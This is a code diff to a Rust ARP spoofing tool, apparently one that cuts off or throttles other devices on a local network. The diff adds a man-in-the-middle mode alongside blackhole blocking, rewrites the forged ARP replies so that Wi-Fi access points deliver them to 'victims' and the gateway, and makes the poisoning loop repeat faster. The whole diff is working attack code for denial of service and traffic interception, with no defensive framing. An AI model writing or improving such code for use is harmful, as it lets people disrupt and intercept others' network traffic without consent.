@@ -24,6 +24,14 @@ use crate::types::{Host, HostStatus, MacAddress};
 /// preventing the blocked victim's packet flood from saturating the local host's adapter.
 pub const BLACKHOLE_MAC: MacAddress = MacAddress([0x02, 0xbf, 0x00, 0x00, 0x00, 0x01]);
 
+#[derive(Debug, Clone, Copy, PartialEq, Eq)]
+pub enum SpooferMode {
+    /// L2 blackholing: Victims send traffic to BLACKHOLE_MAC, silently dropped by L2 switch/AP
+    Blackhole,
+    /// MITM kernel drop: Victims send traffic to local host MAC, dropped by WinDivert kernel filter
+    Mitm,
+}
+
 #[derive(Clone)]
 pub struct ArpSpoofer {
     sender: Arc<RwLock<Option<RawL2Sender>>>,
@@ -32,6 +40,7 @@ pub struct ArpSpoofer {
     gateway_mac: MacAddress,
     targets: Arc<RwLock<HashMap<Ipv4Addr, Host>>>,
     running: Arc<AtomicBool>,
+    mode: Arc<RwLock<SpooferMode>>,
 }
 
 impl ArpSpoofer {
@@ -47,6 +56,7 @@ impl ArpSpoofer {
             gateway_mac,
             targets: Arc::new(RwLock::new(HashMap::new())),
             running: Arc::new(AtomicBool::new(false)),
+            mode: Arc::new(RwLock::new(SpooferMode::Blackhole)),
         }
     }
 
@@ -63,6 +73,7 @@ impl ArpSpoofer {
             gateway_mac,
             targets: Arc::new(RwLock::new(HashMap::new())),
             running: Arc::new(AtomicBool::new(false)),
+            mode: Arc::new(RwLock::new(SpooferMode::Blackhole)),
         }
     }
 
@@ -87,7 +98,16 @@ impl ArpSpoofer {
             gateway_mac,
             targets: Arc::new(RwLock::new(HashMap::new())),
             running: Arc::new(AtomicBool::new(false)),
+            mode: Arc::new(RwLock::new(SpooferMode::Blackhole)),
         }
+    }
+
+    pub fn mode(&self) -> SpooferMode {
+        *self.mode.read()
+    }
+
+    pub fn set_mode(&self, mode: SpooferMode) {
+        *self.mode.write() = mode;
     }
 
     pub fn has_sender(&self) -> bool {
@@ -158,10 +178,11 @@ impl ArpSpoofer {
     pub fn restore(&self, host: &Host) {
         if let Some(ref sender) = *self.sender.read() {
             for _ in 0..3 {
-                // Restore host: tell host that gateway is at genuine gateway_mac
+                // Restore host: tell host that gateway is at genuine gateway_mac.
+                // Ethernet source MAC must be host's local_mac (the transmitting adapter).
                 let pkt_host = craft_arp_reply(
                     host.mac,
-                    self.gateway_mac,
+                    self.local_mac,
                     self.gateway_ip,
                     self.gateway_mac,
                     host.ip,
@@ -169,10 +190,11 @@ impl ArpSpoofer {
                 );
                 let _ = sender.send_frame(&pkt_host);
 
-                // Restore gateway: tell gateway that host is at genuine host.mac
+                // Restore gateway: tell gateway that host is at genuine host.mac.
+                // Ethernet source MAC must be host's local_mac (the transmitting adapter).
                 let pkt_gw = craft_arp_reply(
                     self.gateway_mac,
-                    host.mac,
+                    self.local_mac,
                     host.ip,
                     host.mac,
                     self.gateway_ip,
@@ -192,6 +214,7 @@ impl ArpSpoofer {
         let targets = Arc::clone(&self.targets);
         let sender = Arc::clone(&self.sender);
         let running = Arc::clone(&self.running);
+        let mode = Arc::clone(&self.mode);
         let local_mac = self.local_mac;
         let gateway_ip = self.gateway_ip;
         let gateway_mac = self.gateway_mac;
@@ -205,19 +228,24 @@ impl ArpSpoofer {
                             break;
                         }
 
-                        // Determine target MAC for poisoning based on status:
-                        // - For Blocked: use BLACKHOLE_MAC so traffic never enters our adapter,
-                        //   preventing airtime/CPU/buffer saturation on our own connection.
+                        // Determine target MAC for poisoning based on status and spoofer mode:
+                        // - For Blocked: if SpooferMode::Blackhole, use BLACKHOLE_MAC so traffic is
+                        //   dropped at L2 by the switch/AP. If SpooferMode::Mitm, route to local_mac
+                        //   so WinDivert kernel filter drops packets.
                         // - For Limited: route to local_mac so WinDivert can shape packets.
                         let (spoof_gw_mac, spoof_host_mac) = match host.status {
                             HostStatus::Blocked(dir) => {
+                                let block_target_mac = match *mode.read() {
+                                    SpooferMode::Blackhole => BLACKHOLE_MAC,
+                                    SpooferMode::Mitm => local_mac,
+                                };
                                 let gw_mac = if dir.includes_outgoing() {
-                                    BLACKHOLE_MAC
+                                    block_target_mac
                                 } else {
                                     local_mac
                                 };
                                 let h_mac = if dir.includes_incoming() {
-                                    BLACKHOLE_MAC
+                                    block_target_mac
                                 } else {
                                     local_mac
                                 };
@@ -226,10 +254,12 @@ impl ArpSpoofer {
                             _ => (local_mac, local_mac),
                         };
 
-                        // Poison target host: Gateway IP is at spoof_gw_mac
+                        // Poison target host: Gateway IP is at spoof_gw_mac.
+                        // Ethernet frame source MAC MUST be local_mac (transmitting station address on medium)
+                        // so Wi-Fi APs and 802.11/NDIS firmware deliver the packet rather than dropping it.
                         let pkt_host = craft_arp_reply(
                             host.mac,
-                            spoof_gw_mac,
+                            local_mac,
                             gateway_ip,
                             spoof_gw_mac,
                             host.ip,
@@ -237,10 +267,11 @@ impl ArpSpoofer {
                         );
                         let _ = s.send_frame(&pkt_host);
 
-                        // Poison gateway: Host IP is at spoof_host_mac
+                        // Poison gateway: Host IP is at spoof_host_mac.
+                        // Ethernet frame source MAC MUST be local_mac.
                         let pkt_gw = craft_arp_reply(
                             gateway_mac,
-                            spoof_host_mac,
+                            local_mac,
                             host.ip,
                             spoof_host_mac,
                             gateway_ip,
@@ -249,7 +280,7 @@ impl ArpSpoofer {
                         let _ = s.send_frame(&pkt_gw);
                     }
                 }
-                for _ in 0..20 {
+                for _ in 0..10 {
                     if !running.load(Ordering::Relaxed) {
                         break;
                     }
